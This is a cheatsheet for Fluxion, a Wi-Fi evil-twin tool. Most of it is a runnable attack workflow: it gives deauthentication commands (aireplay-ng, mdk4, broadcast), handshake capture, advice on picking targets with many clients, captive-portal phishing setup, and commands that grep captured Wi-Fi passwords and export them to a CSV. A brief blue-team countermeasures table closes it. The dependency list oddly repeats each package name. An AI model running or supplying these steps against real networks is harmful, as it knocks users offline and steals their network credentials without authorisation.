# Fluxion Cheatsheet

## Quick Start

```bash
# Launch interactive mode
sudo fluxion

# Install dependencies only
sudo fluxion.sh -i

# From source
git clone https://github.com/FluxionNetwork/fluxion.git
cd fluxion && ./fluxion.sh
```

## Attack Workflow

```
1. Launch Fluxion → sudo fluxion
2. Select wireless interface (wlan0)
3. Kill conflicting processes (auto)
4. Enable monitor mode (auto)
5. Scan for target networks
6. Select target AP
7. Capture WPA handshake
8. Select Captive Portal attack
9. Configure attack parameters
10. Monitor for password submissions
```

## Essential Commands

| Command | Description |
|---------|-------------|
| `sudo fluxion` | Launch interactive TUI |
| `sudo fluxion.sh -i` | Install/check dependencies |
| `sudo fluxion.sh --help` | Show help |

## Aircrack-ng Suite Commands

```bash
# Start monitor mode
sudo airmon-ng start wlan0

# Kill conflicting processes
sudo airmon-ng check kill

# Scan networks
airodump-ng wlan0mon

# Capture handshake
airodump-ng -c 6 --bssid TARGET_BSSID -w handshake wlan0mon

# Deauth clients
sudo aireplay-ng --deauth 10 -a TARGET_BSSID wlan0mon

# Verify handshake
aircrack-ng handshake-01.cap
```

## Wireless Adapter Requirements

| Feature | Required |
|---------|----------|
| Monitor mode | Yes |
| Packet injection | Yes |
| 2.4 GHz | Yes |
| 5 GHz | Optional |
| Recommended | Alfa AWUS036ACH, AWUS036ACM |

```bash
# Check adapter capabilities
iw list | grep -A 10 "Supported interface modes"

# Test injection
aireplay-ng --test wlan0
```

## Target Selection

```bash
# Scan for targets
airodump-ng wlan0mon

# Output columns:
# BSSID    - AP MAC address
# CH       - Channel
# dBm      - Signal strength
# ENC      - Encryption (WPA2, WPA, OPN)
# ESSID    - Network name
# CLIENTS  - Connected clients count

# Select targets with:
# - WPA2 encryption
# - High signal strength
# - Multiple connected clients
```

## Captive Portal Options

| Portal | Language |
|--------|----------|
| English | Default |
| Spanish | Español |
| French | Français |
| German | Deutsch |
| Arabic | العربية |
| Custom | User-defined |

```bash
# Portal pages location
ls /usr/share/fluxion/attacks/Captive\ Portal/sites/

# Custom portals
# Place HTML files in the sites directory
```

## Dependencies

```bash
# Full dependency list
aircrack-ng aircrack-ng
hostapd hostapd
dnsmasq dnsmasq
lighttpd lighttpd
php-cgi php-cgi
mdk4 mdk4
nmap nmap
macchanger macchanger
iw iw
rfkill rfkill
curl curl
bc bc
gawk gawk
```

## Installation

### Kali Linux

```bash
sudo apt update
sudo apt install fluxion
```

### Arch Linux

```bash
pacman -S fluxion
```

### From Source

```bash
git clone https://github.com/FluxionNetwork/fluxion.git
cd fluxion
chmod +x fluxion.sh
./fluxion.sh
```

## Attack Parameters

| Parameter | Description |
|-----------|-------------|
| ESSID | Target network name |
| Channel | Target AP channel |
| Interface | Wireless adapter |
| Deauth method | mdk4 or aireplay-ng |
| Portal type | Captive portal design |

## Deauthentication Methods

```bash
# mdk4 (default, recommended)
mdk4 wlan0mon d -b target_list.txt

# aireplay-ng (alternative)
aireplay-ng --deauth 10 -a TARGET_BSSID wlan0mon

# Broadcast deauth
mdk4 wlan0mon d -c CHANNEL
```

## Log Analysis

```bash
# Find captured passwords
find /tmp/fluxion-*/logs/ -name "*.log"

# Parse credentials
grep "PASSWORD:" /tmp/fluxion-*/logs/*.log

# Export to CSV
awk '{print $1","$2}' /tmp/fluxion-*/logs/*.log > wifi_creds.csv
```

## Port Requirements

| Port | Protocol | Service |
|------|----------|---------|
| 53 | UDP/TCP | DNS (dnsmasq) |
| 67 | UDP | DHCP (dnsmasq) |
| 80 | TCP | Captive portal (lighttpd) |

## Troubleshooting

```bash
# Wireless adapter not found
lsusb | grep -i wireless
sudo apt install realtek-rtl88xxau-dkms

# Monitor mode not working
sudo airmon-ng check kill
sudo airmon-ng start wlan0
iwconfig wlan0mon

# Handshake not captured
sudo mdk4 wlan0mon d -b targets.txt
# Wait for clients to reconnect

# Captive portal not loading
ps aux | grep dnsmasq
ps aux | grep lighttpd
ps aux | grep hostapd

# Password verification fails
aircrack-ng /tmp/fluxion-*/handshake-01.cap

# WSL incompatibility
# Fluxion does NOT work on WSL/WSL2
# Use native Linux or VM with USB passthrough
```

## WPA2-Enterprise Note

```
Fluxion works against WPA2-PSK networks only.
WPA2-Enterprise (802.1X) uses individual credentials,
not a shared pre-shared key, and requires different attack vectors.

Detection:
airodump-ng wlan0mon | grep "WPA2"
# Look for "Authentication: PSK" vs "802.1X"
```

## Blue Team Countermeasures

| Countermeasure | Description |
|---------------|-------------|
| WPA3-SAE | Resistant to offline dictionary attacks |
| 802.1X | Individual credentials, not shared PSK |
| 802.11w (PMF) | Protected Management Frames |
| WIPS | Wireless Intrusion Prevention System |
| Client isolation | Prevent client-to-client traffic |
| Certificate pinning | Require server certificates |

## Related Tools

| Tool | Purpose |
|------|---------|
| `aircrack-ng` | WPA handshake capture + cracking |
| `hostapd` | Rogue AP daemon |
| `dnsmasq` | DHCP + DNS server |
| `mdk4` | Deauthentication attacks |
| `wifite` | Automated wireless auditing |
| `hostapd-mana` | WPA2-Enterprise attacks |
